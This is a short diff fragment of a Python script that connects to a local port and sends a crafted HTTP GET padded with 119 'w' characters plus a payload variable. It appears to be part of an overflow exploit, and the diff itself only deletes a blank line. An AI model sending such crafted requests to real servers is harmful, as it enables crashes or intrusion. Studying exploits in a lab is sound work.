@@ -53,7 +53,6 @@ sock = socket.create_connection(('127.0.0.1', port),
                                 ('127.0.0.1', 0))
 
 sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
-
 time.sleep(5)
 
 port = int(sys.argv[2])
